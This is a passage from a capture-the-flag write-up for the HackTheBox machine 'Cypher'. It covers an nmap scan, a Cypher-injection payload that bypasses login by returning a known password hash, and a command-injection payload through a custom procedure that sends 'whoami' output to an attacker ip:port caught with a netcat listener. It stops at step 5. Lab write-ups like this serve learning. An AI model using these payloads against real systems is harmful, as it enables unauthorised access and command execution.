## Step 1: Scan for Open Ports

First thing, let's scan for open ports with the following `nmap` command:

```bash
nmap -sV -sC -p- --defeat-rst-ratelimit -O -A cypher.htb
```
## Scan results:
![Nmap port scan](img/nmap.png)

## Step 2: Investigate website

With only ports 80 and 22 open, we’ll start by examining the web service.

![Login page](img/loginpage.png)

## Step 3: Cypher injection

After trying some Cypher injection payloads we can see that there is a huge error popping up. This strongly suggests a potential Cypher injection vulnerability.

![Login page after injecting 'OR 1=1](img/image.png)

## Step 4: Crafting authentication bypass payload

```bash
{
  "username": "admin' OR 1=1 RETURN 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3' AS hash //",
  "password": "test"
}
```
### How this works?
This payload returns the hash of the string "test", which is then used for comparison against the user-provided password hash instead of actual admins hash.

![Demo page](img/Demopage.png)

## Step 5: Crafting SSRF payload with Cypher Injection

```bash
CALL custom.getUrlStatusCode("http://ip:port/?c=$(whoami)")
```

This payload uses custom function that tries to return a status code, but also executes command given at the end.

### How to use?

1. Set up netcat listener on your port.

```bash
nc -lnvp 4444
```

2. Enter the payload into search query on the website.



